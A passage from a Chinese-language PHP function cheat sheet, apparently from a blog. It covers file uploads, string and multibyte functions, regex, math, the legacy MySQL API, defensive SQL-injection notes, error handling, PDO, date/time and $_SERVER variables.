class="line">//多文件上传</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;updfile[]&quot; /&gt; //HTML中以数组提交</span><br><span class="line">$_FILES[&#x27;updfile&#x27;][&#x27;tmp_name&#x27;][0]   //服务器端可访问第一个文件的临时路径，其他属性类似</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//php.ini配置</span><br><span class="line">file_uploads = On 是否允许HTTP上传文件</span><br><span class="line">upload_max_filesize 上传文件大小限制，默认为2M</span><br><span class="line">post_max_size   post方式表单数据总大小限制，默认为8M</span><br><span class="line">upload_tmp_dir  上传文件临时目录，默认是系统临时目录</span><br><span class="line">    需设置上传文件临时目录，给其最小权限</span><br><span class="line">GET方式的最大传输量为2K</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【批量提交】 */</span><br><span class="line">FORM表单中的name值可用名称加中括号的形式，在$_POST获取表单数据时，可多项提交形成数组。</span><br><span class="line">比如多文件上传file，复选框提交checkbox等。</span><br><span class="line">&lt;input type=&quot;checkbox&quot; name=&quot;id[]&quot; value=&quot;值1&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;checkbox&quot; name=&quot;id[]&quot; value=&quot;值2&quot; /&gt;</span><br><span class="line">$id = $_POST[&#x27;id&#x27;]; //则可获得全部被选中的复选框值，形成索引数组</span><br><span class="line">如果name值为：</span><br><span class="line">&lt;input type=&quot;checkbox&quot; name=&quot;id[one]&quot; value=&quot;值1&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;checkbox&quot; name=&quot;id[two]&quot; value=&quot;值2&quot; /&gt;</span><br><span class="line">$id = $_POST[&#x27;id&#x27;];  //则可获取所有name为id[...]的值，形成管理数组</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* iconv */</span><br><span class="line">//php.ini配置iconv</span><br><span class="line">[iconv]</span><br><span class="line">;iconv.input_encoding = ISO-8859-1</span><br><span class="line">;iconv.output_encoding = ISO-8859-1</span><br><span class="line">;iconv.internal_encoding = ISO-8859-1</span><br><span class="line">iconv_set_encoding($type, $charset);</span><br><span class="line">    $type：input_encoding，output_encoding，internal_encoding</span><br><span class="line">iconv_get_encoding([$type = &quot;all&quot;])</span><br><span class="line">    $type：all，input_encoding，output_encoding，internal_encoding</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">iconv($in_charset, $out_charset, $str) //将字符串转换为目标编码</span><br><span class="line"> </span><br><span class="line">指定编码，可解决中文字符的统计、查询、截取等！</span><br><span class="line">iconv_strlen($str [,$charset]) //统计字符串的字符数</span><br><span class="line">iconv_strpos($str, $needle, $offset [,$charset]) //查找子串首次出现的位置</span><br><span class="line">iconv_strrpos($str, $needle [,$charset]) //查找子串最后一次出现的位置</span><br><span class="line">iconv_substr($str, $offset [,$len [,$charset]]) //截取子串</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【字符串函数】*/</span><br><span class="line">addslashes($str)    //使用反斜线转移字符串</span><br><span class="line">stripcslashes($str) //反引用一个使用addcslashes转义的字符串</span><br><span class="line">stripslashes($str)  //反引用一个引用字符串</span><br><span class="line">chr($ascii) //返回ASCII码的字符</span><br><span class="line">ord($char)  //返回字符的ASCII码</span><br><span class="line">substr_count($haystack, $needle)    //计算子串出现的次数</span><br><span class="line">count_chars($str [,$mode])  统计每个字节值出现的次数</span><br><span class="line">    //0 - 以所有的每个字节值作为键名，出现次数作为值的数组。  </span><br><span class="line">    //1 - 与0相同，但只列出出现次数大于零的字节值。  </span><br><span class="line">    //2 - 与0相同，但只列出出现次数等于零的字节值。  </span><br><span class="line">    //3 - 返回由所有使用了的字节值组成的字符串。  </span><br><span class="line">    //4 - 返回由所有未使用的字节值组成的字符串。 </span><br><span class="line">crypt($str, [$salt])    //单向字符串散列</span><br><span class="line">str_split($str [,$len]) //将字符串按长度分割为数组</span><br><span class="line">explode($separ, $str)   //使用一个字符串分割另一个字符串</span><br><span class="line">implode([$glue,] $arr)  //将数组元素的值根据$glue连接成字符串</span><br><span class="line">chunk_split($str [,$len [,$end]])   //将字符串分割成小块</span><br><span class="line">    $len：每段字符串的长度，$end：每段字符串末尾加的字符串(如&quot;\r\n&quot;)</span><br><span class="line">html_entity_decode($str [,$flags [,$encoding]]) //将HTML实体转成字符信息</span><br><span class="line">htmlentities($str [,$flags [,$encoding]])   //将字符信息转成HTML实体</span><br><span class="line">htmlspecialchars_decode($str)   //将特殊HTML实体转成字符信息</span><br><span class="line">htmlspecialchars($str [,$flags [,$encoding]])   //将字符信息转成特殊HTML实体</span><br><span class="line">lcfirst($str)   //将字符串首字母转成小写</span><br><span class="line">ucfirst($str)   //将字符串首字母转成大写</span><br><span class="line">ucwords($str)   //将字符串中每个单词的首字母转换为大写</span><br><span class="line">strtolower($str)    //将字符串转化为小写</span><br><span class="line">strtoupper($str)    //将字符串转化为大写</span><br><span class="line">trim($str [,$charlist]) //去除字符串首尾处的空白字符（或者其他字符）</span><br><span class="line">ltrim($str [,$charlist])    //去除字符串首段的空白字符（或者其他字符）</span><br><span class="line">rtrim($str [,$charlist])    //去除字符串末端的空白字符（或者其他字符）</span><br><span class="line">md5_file($file) //计算指定文件的MD5散列值</span><br><span class="line">md5($str)   //计算字符串的MD5散列值</span><br><span class="line">money_format($format, $num) //将数字格式化为货币形式</span><br><span class="line">number_format($num) //格式化数字</span><br><span class="line">nl2br($str) //在字符串所有新行之前插入HTML换行标记&lt;br /&gt;</span><br><span class="line">parse_str($str, [$arr]) //解析字符串</span><br><span class="line">print($str) //输出字符串</span><br><span class="line">printf      //输出格式化字符串</span><br><span class="line">sprintf($format [,$args...])    //格式化字符串</span><br><span class="line">sha1_file   //计算文件的sha1散列值</span><br><span class="line">sha1        //计算字符串的sha1散列值</span><br><span class="line">similar_text($first, $second [,$percent])   //计算两个字符串的相似度</span><br><span class="line">    返回在两个字符串中匹配字符的数目，$percent存储相似度百分比</span><br><span class="line">str_replace($search, $replace, $str [,$count [,$type]])  //子字符串替换</span><br><span class="line">str_ireplace    //字符串替换(忽略大小写)</span><br><span class="line">str_pad($str, $len [,$pad [,$type]])  //使用另一个字符串填充字符串为指定长度</span><br><span class="line">    $type：在何处填充。STR_PAD_RIGHT，STR_PAD_LEFT 或 STR_PAD_BOTH</span><br><span class="line">str_repeat($str, $num)  //重复一个字符串</span><br><span class="line">str_shuffle($str)   //随机打乱一个字符串</span><br><span class="line">str_word_count($str [,$format [,$charlist]])    //返回字符串中单词的使用情况</span><br><span class="line">strcasecmp($str1, $str2)    //二进制安全比较字符串（不区分大小写）</span><br><span class="line">    如果str1小于str2，返回负数；如果str1大于str2，返回正数；二者相等则返回0。</span><br><span class="line">strcmp($str1, $str2)    //二进制安全字符串比较</span><br><span class="line">strcoll($str1, $str1)   //基于区域设置的字符串比较(区分大小写，非二进制安全)</span><br><span class="line">strcspn($str1, $str1 [,$start [,$len]])   //获取不匹配遮罩的起始子字符串的长度</span><br><span class="line">strip_tags($str)    //从字符串中去除HTML和PHP标记</span><br><span class="line">strpos($haystack, $needle [,$offset])   //查找字符串首次出现的位置</span><br><span class="line">stripos($haystack, $needle [,$offset])    //查找字符串首次出现的位置（不区分大小写）</span><br><span class="line">strripos($haystack, $needle [,$offset])   //计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</span><br><span class="line">strrpos($haystack, $needle [,$offset])   //计算指定字符串在目标字符串中最后一次出现的位置</span><br><span class="line">strlen($str)    //获取字符串长度</span><br><span class="line">strpbrk($haystack, $str)    //在字符串中查找一组字符的任何一个字符</span><br><span class="line">strrev($str)    //反转字符串</span><br><span class="line">    join(&#x27;&#x27;, array_reverse(preg_split(&quot;//u&quot;, $str))); //实现对UTF-8字符串的反转</span><br><span class="line">strspn$subject, $mask)  //计算字符串中全部字符都存在于指定字符集合中的第一段子串的长度。</span><br><span class="line">strstr($haystack, $needle)   //查找字符串的首次出现</span><br><span class="line">stristr($haystack, $needle)   //查找字符串的首次出现(不区分大小写)</span><br><span class="line">strrchr($haystack, $needle) //查找指定字符在字符串中的最后一次出现</span><br><span class="line">strtok($str, $token)    //标记分割字符串</span><br><span class="line">substr_compare($main_str, $str, $offset [,$len) //二进制安全比较字符串（从偏移位置比较指定长度）</span><br><span class="line">substr_replace$str, $replace, $start [,$len]    //替换字符串的子串</span><br><span class="line">strtr($str, $from, $to) //转换指定字符</span><br><span class="line">substr($str, $start [,$len])    //返回字符串的子串</span><br><span class="line">vfprintf$handle, $format, $args)    //将格式化字符串写入流</span><br><span class="line">vprintf($format, $args) //输出格式化字符串</span><br><span class="line">vsprintf($format, $args) //返回格式化字符串</span><br><span class="line">wordwrap($str [,$width=75 [,$break=&#x27;\n&#x27;]])  //打断字符串为指定数量的字串</span><br><span class="line"> </span><br><span class="line">crc32($str) //计算一个字符串的crc32多项式</span><br><span class="line">    crc32算法[循环冗余校验算法]</span><br><span class="line">    生成str的32位循环冗余校验码多项式。将数据转换成整数。</span><br><span class="line"> </span><br><span class="line">/* mbstring(多字节字符串) */</span><br><span class="line">//需开启mbstring扩展</span><br><span class="line">mb_strimwidth($str, $start, $width [,$trim [,$encoding]])   //保留指定的子串(并补充)</span><br><span class="line">mb_stripos($str, $needle [,$offset [,$encoding]])   //查找子串首次出现的位置(忽略大小写)</span><br><span class="line">mb_strpos($str, $needle [,$offset [,$encoding]])   //查找子串首次出现的位置</span><br><span class="line">mb_strripos($str, $needle [,$offset [,$encoding]])   //查找子串最后一次出现的位置(忽略大小写)</span><br><span class="line">mb_strrpos($str, $needle [,$offset [,$encoding]])   //查找子串最后一次出现的位置</span><br><span class="line">mb_strstr($str, $needle [,$before [,$encoding]])    //返回子串首次出现位置之后(前)的字符串</span><br><span class="line">mb_stristr($str, $needle [,$before [,$encoding]])    //返回子串首次出现位置之后(前)的字符串(忽略大小写)</span><br><span class="line">mb_strrchr($str, $needle [,$before [,$encoding]])    //返回字符最后一次出现位置之后(前)的字符串</span><br><span class="line">mb_strrichr($str, $needle [,$before [,$encoding]])    //返回字符最后一次出现位置之后(前)的字符串(忽略大小写)</span><br><span class="line"> </span><br><span class="line">mb_strtoupper($str [,$encoding])    //转换成大写</span><br><span class="line">mb_strtolower($str [,$encoding])    //转换成小写</span><br><span class="line"> </span><br><span class="line">mb_strlen($str [,$encoding])    //获取字符串长度</span><br><span class="line">mb_split($pattern, $str [,$limit])  //将字符串分割成数组</span><br><span class="line">mb_substr($str, $start [,$len [,$encoding]])    //获取字符串的子串</span><br><span class="line">mb_strcut($str, $start [,$len [,$encoding]])    //获取字符串的子串</span><br><span class="line">mb_strwidth($str [,$encoding])  //获取字符串的宽度</span><br><span class="line">mb_substr_count($str, $needle [,$encoding]) //子串在字符串中出现的次数</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* PCRE函数 */</span><br><span class="line">preg_filter($pattern, $replace, $subject [,$limit [,&amp;$count]])  执行一个正则表达式搜索和替换</span><br><span class="line">preg_replace($pattern, $replace, $subject [,$limit [,&amp;$count]])  执行一个正则表达式搜索和替换</span><br><span class="line">preg_replace_callback($pattern, $callback, $subject [,$limit [,&amp;$count]])   执行一个正则表达式搜索并且使用一个回调进行替换</span><br><span class="line">preg_grep($pattern, $input [,$flags])   返回匹配模式的数组条目</span><br><span class="line">preg_match($pattern, $subject [,&amp;$matches [,$flags [,$offset]]]) 执行一个正则表达式匹配</span><br><span class="line">preg_match_all($pattern, $subject [,&amp;$matches [,$flags [,$offset]]]) 执行一个全局正则表达式匹配</span><br><span class="line">    $matches存放返回的结果</span><br><span class="line">        $matches[0][n] (n&gt;=0) 表示存放第n+1个匹配到的结果</span><br><span class="line">        $matches[m][n] (m&gt;=1, n&gt;=0) 表示存放第n+1个匹配到结果的第m个表达式的内容</span><br><span class="line">preg_split($pattern, $subject [,$limit [,$flags]])  通过一个正则表达式分隔字符串</span><br><span class="line">    $limit表示限制分隔得到的子串最多只有limit个，-1表示不限制</span><br><span class="line">    $flags参数：</span><br><span class="line">        PREG_SPLIT_NO_EMPTY：将返回分隔后的非空部分</span><br><span class="line">        PREG_SPLIT_DELIM_CAPTURE：用于分隔的模式中的括号表达式将被捕获并返回</span><br><span class="line">        PREG_SPLIT_OFFSET_CAPTURE：对于每一个出现的匹配返回时将会附加字符串偏移量</span><br><span class="line">preg_quote($str [,$delimiter])  转义正则表达式字符</span><br><span class="line">preg_last_error()   返回最后一个PCRE正则执行产生的错误代码</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* Math函数 */</span><br><span class="line">base_convert($number, $frombase, $tobase)   //在任意进制之间转换数字</span><br><span class="line">ceil($float)    //向上取整</span><br><span class="line">floor($float)   //向下取整</span><br><span class="line">exp($float) //计算e的指数</span><br><span class="line">hypot($x, $y)   //计算直角三角形的斜边长</span><br><span class="line">is_nan($val)    //判断是否为合法数值</span><br><span class="line">log($arg [,$base=e])  //自然对数</span><br><span class="line">max($num1, $num2, ...)  //找出最大值</span><br><span class="line">    max($arr)   //找出数组中的最大值</span><br><span class="line">min($num1, $num2, ...)  //找出最小值</span><br><span class="line">rand([$min], $max)  //产生一个随机整数</span><br><span class="line">srand([$seed])  //播下随机数发生器种子</span><br><span class="line">mt_rand([$min], $max)   //生成更好的随机数</span><br><span class="line">mt_srand($seed)     //播下一个更好的随机数发生器种子</span><br><span class="line">pi()    //得到圆周率值</span><br><span class="line">pow($base, $exp)    //指数表达式</span><br><span class="line">sqrt($float)    //求平方根</span><br><span class="line">deg2rad($float) //将角度转换为弧度</span><br><span class="line">rad2deg($float) //将弧度数转换为相应的角度数</span><br><span class="line">round($val [,$pre=0]) //对浮点数进行四舍五入</span><br><span class="line">fmod($x, $y) //返回除法的浮点数余数</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【MySQL函数】 */</span><br><span class="line">mysql_client_encoding([$link])  //返回字符集的名称</span><br><span class="line">mysql_set_charset($charset [,$link])    //设置客户端字符集编码</span><br><span class="line">mysql_connect($host, $user, $pass)  //打开一个到MySQL服务器的连接</span><br><span class="line">mysql_create_db($db [,$link])   //新建一个MySQL数据库</span><br><span class="line">mysql_pconnect($host, $user, $pass) //打开一个到MySQL服务器的持久连接</span><br><span class="line">mysql_ping([$link]) //Ping一个服务器连接，如果没有连接则重新连接</span><br><span class="line">mysql_close([$link])    //关闭MySQL连接</span><br><span class="line"> </span><br><span class="line">mysql_data_seek($result, $row)  //移动内部结果的指针</span><br><span class="line">mysql_errno([$link])    //返回上一个MySQL操作中的错误信息的数字编码</span><br><span class="line">mysql_error([$link])    //返回上一个MySQL操作产生的文本错误信息</span><br><span class="line">mysql_affected_rows([$link])  //取得前一次MySQL操作所影响的记录行数</span><br><span class="line">mysql_info([$link]) //取得最近一条查询的信息</span><br><span class="line">mysql_insert_id([$link])    //取得上一步INSERT操作产生的ID</span><br><span class="line"> </span><br><span class="line">mysql_query($sql [,$link])  //发送一条MySQL查询</span><br><span class="line">mysql_unbuffered_query($sql [,$link])   //向MySQL发送一条SQL查询，并不获取和缓存结果的行</span><br><span class="line">mysql_db_query($db, $sql [,$link])  //发送一条MySQL查询</span><br><span class="line"> </span><br><span class="line">mysql_escape_string($str)   //转义一个字符串用于mysql_query</span><br><span class="line">mysql_real_escape_string($str)  //转义SQL语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集</span><br><span class="line"> </span><br><span class="line">mysql_fetch_array($result [,$type]) //从结果集中取得一行作为关联数组，或数字数组，或二者兼有</span><br><span class="line">mysql_fetch_assoc($result)  //从结果集中取得一行作为关联数组</span><br><span class="line">mysql_fetch_object($result) //从结果集中取得一行作为对象</span><br><span class="line">mysql_fetch_row($result)    //从结果集中取得一行作为枚举数组</span><br><span class="line">mysql_fetch_field($result)  //从结果集中取得列信息并作为对象返回</span><br><span class="line">mysql_num_fields($result)   //取得结果集中字段的数目</span><br><span class="line">mysql_num_rows($result) //取得结果集中行的数目</span><br><span class="line"> </span><br><span class="line">mysql_fetch_lengths($result)    //取得结果集中每个输出的长度</span><br><span class="line">mysql_field_flags($result, $field_offset)    //从结果中取得和指定字段关联的标志</span><br><span class="line">mysql_field_len($result, $field_offset)    //返回指定字段的长度</span><br><span class="line">mysql_field_name($result, $field_offset)    //取得结果中指定字段的字段名</span><br><span class="line">mysql_field_seek($result, $field_offset)    //将结果集中的指针设定为制定的字段偏移量</span><br><span class="line">mysql_field_table($result, $field_offset)   //取得指定字段所在的表名</span><br><span class="line">mysql_field_type($result, $field_offset)    //取得结果集中指定字段的类型</span><br><span class="line">mysql_free_result($result)  //释放结果内存</span><br><span class="line"> </span><br><span class="line">mysql_list_dbs([$link]) //列出MySQL服务器中所有的数据库</span><br><span class="line">mysql_list_fields($db, $table [,$link]) //列出MySQL结果中的字段</span><br><span class="line">mysql_list_processes([$link])   //列出MySQL进程</span><br><span class="line">mysql_list_tables($db [,$link]) //列出MySQL数据库中的表</span><br><span class="line"> </span><br><span class="line">mysql_result($result, $row [$field])    //取得结果数据</span><br><span class="line">mysql_select_db($db [,$link])   //选择MySQL数据库</span><br><span class="line">mysql_tablename($result, $i)    //取得表名</span><br><span class="line">mysql_db_name($result, $row [,$field])  //取得mysql_list_dbs()调用所返回的数据库名</span><br><span class="line"> </span><br><span class="line">mysql_stat([$link]) //取得当前系统状态</span><br><span class="line">mysql_thread_id([$link])    //返回当前线程的ID</span><br><span class="line">mysql_get_client_info() //取得MySQL客户端信息</span><br><span class="line">mysql_get_host_info()   //取得MySQL主机信息</span><br><span class="line">mysql_get_proto_info()  //取得MySQL协议信息</span><br><span class="line">mysql_get_server_info() //取得MySQL服务器信息</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【SQL注入】 */</span><br><span class="line">特殊字符导致的问题：</span><br><span class="line">    1. 转义：mysql_real_escape_string()</span><br><span class="line">        对外来数据(GPC: GET, POST, COOKIE)进行转义</span><br><span class="line">    2. 先查询当前记录行，再匹配用户名</span><br><span class="line"> </span><br><span class="line">//魔术引号机制</span><br><span class="line">自动为所有提交到服务器的数据增加特殊符号的转义。</span><br><span class="line">当打开时，所有的单引号，双引号，反斜线和NULL字符都会被自动加上一个反斜线进行转义。这和addslashes()作用完全相同。</span><br><span class="line">php.ini配置：</span><br><span class="line">    magic_quotes_gpc = Off</span><br><span class="line">get_magic_quotes_gpc()  获取当前魔术引号机制的配置信息</span><br><span class="line"> </span><br><span class="line">/* 【错误处理】 */</span><br><span class="line">解析错误、运行错误</span><br><span class="line">//标准错误：</span><br><span class="line">    级别、信息、文件、行号</span><br><span class="line">    trigger_error   触发一个用户自定义的error/warning/notice错误信息</span><br><span class="line"> </span><br><span class="line">//php.ini配置，ini_set()</span><br><span class="line">error_reporting         设置报告哪些级别的错误</span><br><span class="line"># 错误报告：显示到页面</span><br><span class="line">    display_errors = On 是否显示错误报告</span><br><span class="line"># 错误日志：存放到文件</span><br><span class="line">    log_errors = on     是否开启错误日志</span><br><span class="line">    error_log           发送错误信息到错误日志文件</span><br><span class="line">- 错误报告和错误日志可同时启用！</span><br><span class="line"> </span><br><span class="line">自定义错误处理器</span><br><span class="line">set_error_handler — 注册自定义错误处理器函数</span><br><span class="line">- 自定义处理器函数包含4个参数，分别是级别、信息、文件、行号</span><br><span class="line">- 开启自定义错误处理器，则系统内置的错误报告和错误日志则不会执行。</span><br><span class="line">- 自定义错误处理器函数返回false，则自定义函数结束后系统内置的会继续执行。</span><br><span class="line">- 用户定义的错误级别(E_USER_ERROR)，可以被自定义的错误处理器所捕获并继续执行。系统内置的错误，则脚本会立即停止。</span><br><span class="line">restore_error_handler — 恢复预定义错误处理器函数</span><br><span class="line">error_get_last — 获取最近的错误信息</span><br><span class="line"> </span><br><span class="line">//错误处理函数</span><br><span class="line">debug_backtrace 产生一条回溯跟踪</span><br><span class="line">    返回数组，包含的键值：function, line, file, class, object, type, args</span><br><span class="line">debug_print_backtrace 打印一条回溯</span><br><span class="line">//错误常量</span><br><span class="line">手册&gt;错误处理</span><br><span class="line">#生产模式</span><br><span class="line">关闭错误报告，记录错误日志。</span><br><span class="line">#开发模式</span><br><span class="line">关闭错误日志，开启错误报告。</span><br><span class="line">//异常</span><br><span class="line">面向对象语法中的错误处理方式。</span><br><span class="line">一个异常就是一个包含当前异常信息的对象。</span><br><span class="line">预定义异常类Exception及其扩展类。</span><br><span class="line">#抛出异常</span><br><span class="line">触发一个异常的错误</span><br><span class="line">throw new UserException();</span><br><span class="line">如果没有被捕获，则报告致命错误。</span><br><span class="line">#监视异常</span><br><span class="line">try &#123;代码段&#125;</span><br><span class="line">#捕获异常</span><br><span class="line">catch (UserException $obj) &#123;代码段&#125;</span><br><span class="line">需要通过当前异常的类型匹配才可悲捕获。</span><br><span class="line">#异常处理器</span><br><span class="line">用以处理未被捕获的异常。</span><br><span class="line">异常处理器函数与catch类似，参数也是含类型的对象。</span><br><span class="line">set_exception_handler — 注册异常处理器函数</span><br><span class="line">restore_exception_handler — 恢复预定义的异常处理器函数</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">#自定义异常</span><br><span class="line">用户定义的异常类须继承自Exception类。</span><br><span class="line"> </span><br><span class="line">//异常相关属性</span><br><span class="line">protected string $message 异常消息内容</span><br><span class="line">protected int $code 异常代码</span><br><span class="line">protected string $file 抛出异常的文件名</span><br><span class="line">protected int $line 抛出异常在该文件中的行号</span><br><span class="line">//异常相关方法</span><br><span class="line">Exception::__construct — 异常构造函数</span><br><span class="line">Exception::getMessage — 获取异常消息内容</span><br><span class="line">Exception::getPrevious — 返回异常链中的前一个异常</span><br><span class="line">Exception::getCode — 获取异常代码</span><br><span class="line">Exception::getFile — 获取发生异常的程序文件名称</span><br><span class="line">Exception::getLine — 获取发生异常的代码在文件中的行号</span><br><span class="line">Exception::getTrace — 获取异常追踪信息</span><br><span class="line">Exception::getTraceAsString — 获取字符串类型的异常追踪信息</span><br><span class="line">Exception::__toString — 将异常对象转换为字符串</span><br><span class="line">Exception::__clone — 异常克隆</span><br><span class="line"> </span><br><span class="line">/* 【数据库抽象层】 */</span><br><span class="line">PDO:PHP Data Objects</span><br><span class="line">PHO抽象层默认被加载，但需加载相应数据库的驱动。</span><br><span class="line">PDO是OOP语法，提供三个类：</span><br><span class="line">PDO：PDO自身</span><br><span class="line">PDOStatement：PDO语句类，提供对语句的后续处理</span><br><span class="line">PDOException：PDO异常类，提供对错误的异常处理</span><br><span class="line"> </span><br><span class="line">//连接数据库</span><br><span class="line">PDO::__construct(str $dsn [,str $username [,str $password [,arr $driver_options]]])</span><br><span class="line">DSN：Data Source Name，数据源</span><br><span class="line">$dsn = &#x27;mysql:dbname=testdb;host=127.0.0.1;port=3306&#x27;;</span><br><span class="line">//执行没有返回结果的SQL语句</span><br><span class="line">int PDO::exec(str $statement)   //返回影响的记录数</span><br><span class="line">//执行有返回结果集的SQL语句</span><br><span class="line">PDOStatement PDO::query (string $statement) //返回PDOStatement对象</span><br><span class="line">//处理结果集(PDOStatement对象)</span><br><span class="line">array PDOStatement::fetchAll([int $fetch_style [,mixed $fetch_argument [,array $ctor_args = array()]]])    //默认返回关联+索引数组</span><br><span class="line">mixed PDOStatement::fetch ([ int $fetch_style [, int $cursor_orientation = PDO::FETCH_ORI_NEXT [, int $cursor_offset = 0 ]]] )  //返回一行</span><br><span class="line">string PDOStatement::fetchColumn ([ int $column_number = 0 ] )  //返回一列</span><br><span class="line">//释放资源</span><br><span class="line">unset($pdo) 或 $pdo = null</span><br><span class="line"> </span><br><span class="line">//错误报告</span><br><span class="line">静默模式：silent mode，出现错误，不主动报告错误（默认）</span><br><span class="line">array PDO::errorInfo(void)</span><br><span class="line">警告模式：warning mode，出现错误，触发一个警告级别的错误</span><br><span class="line">异常错误：exception mode，出现错误，抛出异常</span><br><span class="line">bool PDO::setAttribute(int $attribute, mixed $value)    //设置PDO类属性值</span><br><span class="line">PDO::setAttribute(&#x27;PDO::ATTR_ERRMODE&#x27;, &#x27;PDO::ERRMODE_SILENT | PDO::ERRMODE_WARNING | PDO::ERRMODE_EXCEPTION&#x27;)</span><br><span class="line"> </span><br><span class="line">//预处理式执行SQL</span><br><span class="line">可对数据自动转义，可有效抵制SQL注入。</span><br><span class="line">PDOStatement PDO::prepare(string $statement [,array $driver_options=array()])</span><br><span class="line">bool PDOStatement::bindParam ( mixed $parameter , mixed &amp;$variable [, int $data_type = PDO::PARAM_STR [, int $length [, mixed $driver_options ]]] )</span><br><span class="line">bool PDOStatement::execute ([ array $input_parameters ] )</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【AR模式】 */</span><br><span class="line">表  -&gt;  类</span><br><span class="line">字段 -&gt;  类属性</span><br><span class="line">数据 -&gt;  对象</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* Date/Time */</span><br><span class="line">date($format [,$timestamp]) //格式化一个本地时间／日期，$timestamp默认为time()</span><br><span class="line">    Y：4位数字完整表示的年份</span><br><span class="line">    m：数字表示的月份，有前导零</span><br><span class="line">    d：月份中的第几天，有前导零的2位数字</span><br><span class="line">    j：月份中的第几天，没有前导零</span><br><span class="line">    H：小时，24小时格式，有前导零</span><br><span class="line">    h：小时，12小时格式，有前导零</span><br><span class="line">    i：有前导零的分钟数</span><br><span class="line">    s：秒数，有前导零</span><br><span class="line">    L：是否为闰年，如果是闰年为1，否则为0</span><br><span class="line">    M：三个字母缩写表示的月份，Jan到Dec</span><br><span class="line">    W：年份中的第几周，每周从星期一开始</span><br><span class="line">    z：年份中的第几天</span><br><span class="line">    N：数字表示的星期中的第几天</span><br><span class="line">    w：星期中的第几天，数字表示</span><br><span class="line">    e：时区标识</span><br><span class="line">    T：本机所在的时区</span><br><span class="line">    U：从Unix纪元开始至今的秒数(时间戳)</span><br><span class="line">time() //返回当前的Unix时间戳(秒)</span><br><span class="line">microtime([$get_as_float]) //返回当前Unix时间戳和微秒数</span><br><span class="line">    $get_as_float参数存在并且其值等价于TRUE，将返回一个浮点数</span><br><span class="line">strtotime($time [,$now]) //将任何英文文本的日期时间描述解析为Unix时间戳</span><br><span class="line">    date(&quot;Y-m-d H:i:s&quot;, strtotime(&quot;-1 day&quot;)); //格式化前一天的时间戳</span><br><span class="line">    &quot;now&quot;</span><br><span class="line">    &quot;10 September 2000&quot;</span><br><span class="line">    &quot;+1 week&quot;</span><br><span class="line">    &quot;+1 week -2 days 4 hours 2 seconds&quot;</span><br><span class="line">    &quot;last Monday&quot;</span><br><span class="line">    &quot;next Thursday&quot;</span><br><span class="line">gmdate($format [,$timestamp]) //格式化一个GMT/UTC 日期／时间</span><br><span class="line">mktime([$hour = date(&quot;H&quot;) [,$minute = date(&quot;i&quot;) [,$second = date(&quot;s&quot;) [,$month = date(&quot;n&quot;) [,$day = date(&quot;j&quot;) [,$year = date(&quot;Y&quot;) [,$is_dst = -1]]]]]]]) //取得一个日期的Unix时间戳</span><br><span class="line">strftime($format [,$timestamp]) //根据区域设置格式化本地时间／日期</span><br><span class="line">date_default_timezone_get($timezone) //获取默认时区</span><br><span class="line">date_default_timezone_set($timezone) //设置默认时区</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* DateTime */</span><br><span class="line">//date()函数能处理有效时间戳范围是格林威治时间 1901 年 12 月 13 日 20:45:54 到 2038 年 1 月 19 日 03:14:07(因为32位系统能最大正整数限制)</span><br><span class="line">DateTime::__construct([$time=&quot;now&quot;]) //构造方法</span><br><span class="line">    $time若是时间戳，则在时间戳前加@符号，如&#x27;@2345678&#x27;</span><br><span class="line">DateTime::setTimezone($timezone) //设置时区</span><br><span class="line">    eg: $date-&gt;setTimezone(new DateTimeZone(&#x27;PRC&#x27;));</span><br><span class="line">DateTime::format($format) //格式化时间戳，格式化字符串形式同date()函数</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* $_SERVER */</span><br><span class="line">//示例URL：http://desktop/dir/demo.php?a=aaa&amp;b=bbb</span><br><span class="line">PHP_SELF 当前执行脚本的文件名 // /dir/demo.php</span><br><span class="line">GATEWAY_INTERFACE 服务器使用的CGI规范的版本 // CGI/1.1</span><br><span class="line">SERVER_ADDR 当前运行脚本所在的服务器的IP地址 // 127.0.0.1</span><br><span class="line">SERVER_NAME 当前运行脚本所在的服务器的主机名 // desktop</span><br><span class="line">SERVER_SOFTWARE 服务器标识字符串 // Apache/2.2.22 (Win32) PHP/5.3.13</span><br><span class="line">SERVER_PROTOCOL 请求页面时通信协议的名称和版本 // HTTP/1.1</span><br><span class="line">REQUEST_METHOD 访问页面使用的请求方式 // GET</span><br><span class="line">REQUEST_TIME 请求开始时的时间戳 // 1386032633</span><br><span class="line">QUERY_STRING 查询字符串(参数) // a=aaa&amp;b=bbb</span><br><span class="line">DOCUMENT_ROOT 当前运行脚本所在的文档根目录 // C:/Users/Administrator/Desktop</span><br><span class="line">HTTP_ACCEPT 当前请求头中Accept:项的内容 // text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">HTTP_ACCEPT_CHARSET 当前请求头中Accept-Charset:项的内容 // UTF-8,*</span><br><span class="line">HTTP_ACCEPT_ENCODING 当前请求头中Accept-Encoding:项的内容 // gzip, deflate</span><br><span class="line">HTTP_ACCEPT_LANGUAGE 当前请求头中Accept-Language:项的内容 // zh-cn,zh;q=0.5</span><br><span class="line">HTTP_CONNECTION 当前请求头中Connection:项的内容 // keep-alive</span><br><span class="line">HTTP_HOST 当前请求头中Host:项的内容 // desktop</span><br><span class="line">HTTP_REFERER 引导用户代理到当前页的前一页的地址</span><br><span class="line">HTTP_USER_AGENT 当前请求头中User-Agent:项的内容 // Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1</span><br><span class="line">HTTPS 